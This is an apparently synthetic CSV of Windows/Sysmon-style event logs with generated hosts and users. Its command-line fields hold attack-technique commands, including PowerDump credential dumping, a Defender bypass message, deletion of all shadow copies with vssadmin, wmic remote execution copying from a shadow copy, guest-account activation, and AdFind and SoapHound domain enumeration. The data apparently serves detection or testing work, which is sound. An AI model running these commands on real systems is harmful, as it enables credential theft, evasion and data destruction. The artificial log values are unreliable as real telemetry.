EventID,EventType,ComputerName,User,ProcessID,ProcessName,CommandLine,LogonID,LogonGuid,SourceProcessID,SourceProcessName,SourceImage,DestinationProcessID,DestinationProcessName,DestinationImage,UtcTime
5,Process Terminate,laptop-07.coleman-farley.com,gardnerlisa,7591,malware.exe,"""Write-Host \""STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\"" -fore green\nImport-Module \""PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\""\nInvoke-PowerDump"",",239910,aac48b0a-3bbd-4511-8b36-8320328c6c08,8765,backdoor.exe,C:\Program Files\campaign..dll,4798,backdoor.exe,C:\Users\Public\contain..exe,2024-05-17T01:36:51.568345Z
7,Image Load,srv-97.peterson.info,richardmitchell,3688,backdoor.exe,"""# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \""#{test_harness}\""\n\n$InstallerAssemblyDir = \""#{assembly_dir}\""\n$InstallerAssemblyFileName = \""#{assembly_filename}\""\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\""\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\""@\n}\n"",",573375,b850136d-8a30-4ea3-8089-7a4b6a5de9a9,5796,nc.exe,C:\Program Files\standard..exe,5902,taskmgr.exe,C:\Windows\reveal..exe,2024-05-17T01:36:51.569345Z
7,Image Load,lt-16.wilson.net,beth15,2192,powershell.exe,"""wmic /node:\""#{target_host}\"" process call create \""cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}\""\n"",",399394,318b3b83-7192-469d-99c5-f3a35ef5f48b,4231,backdoor.exe,C:\Windows\put..dll,7033,malware.exe,C:\Users\Public\small..exe,2024-05-17T01:36:51.569345Z
1,Process Create,email-40.gregory.com,dburke,1176,cmd.exe,"""copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe\nC:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt\n"",",799297,b082c0c6-8921-4e9e-a4a7-84457a995962,1147,backdoor.exe,C:\Program Files\coach..dll,5296,nc.exe,C:\Users\Public\reality..exe,2024-05-17T01:36:51.569345Z
1,Process Create,lt-60.bond.com,nicolebailey,3455,taskmgr.exe,"""net user #{guest_user} /active:yes\n"",",432743,b1613053-b488-4233-9cc7-29b290f0ff20,1877,regsvr32.exe,C:\Users\Public\need..dll,2170,malware.exe,C:\Program Files\would..exe,2024-05-17T01:36:51.569345Z
1,Process Create,web-55.jones.net,michael34,1691,nc.exe,"""#{compiled_file} /tmp/ T1222002\n"",",371957,b84cf478-fa7a-4ae1-ad1d-7c15c269c115,5606,malware.exe,C:\Users\Public\it..dll,1712,regsvr32.exe,C:\Program Files\recent..exe,2024-05-17T01:36:51.570344Z
3,Network Connection,srv-92.parker-bell.com,vsilva,3537,taskmgr.exe,"""New-WebGlobalModule -Name #{module_name} -Image #{dll_path}\n"",",335721,fae27712-7807-4cf0-bc73-016fb617458f,7842,backdoor.exe,C:\Program Files\western..dll,2223,taskmgr.exe,C:\Program Files\cell..exe,2024-05-17T01:36:51.570344Z
3,Network Connection,lt-27.brown-johnson.net,joseph57,3479,taskmgr.exe,"""\""PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"" #{optional_args} -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties\n"",",343914,9165c713-1b98-4d2d-9a21-164e11a3a8d5,9798,backdoor.exe,C:\Users\Public\safe..exe,8951,rundll32.exe,C:\Windows\wide..exe,2024-05-17T01:36:51.570344Z
11,File Create,desktop-83.wright.com,ramseymonica,8411,regsvr32.exe,"""vssadmin.exe delete shadows /all /quiet\n"",",784608,34e87dad-6e2d-4586-a7c7-913e134c87dc,5589,taskmgr.exe,C:\Program Files\manage..dll,1008,taskmgr.exe,C:\Program Files\reality..exe,2024-05-17T01:36:51.570344Z
11,File Create,email-88.nielsen-wells.com,williamgrant,3502,explorer.exe,"""#{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}\n"",",150844,dd40a89f-db89-439a-8622-0bc27e0f12ed,3163,cmd.exe,C:\Windows\leg..dll,6273,explorer.exe,C:\Users\Public\hot..dll,2024-05-17T01:36:51.570344Z
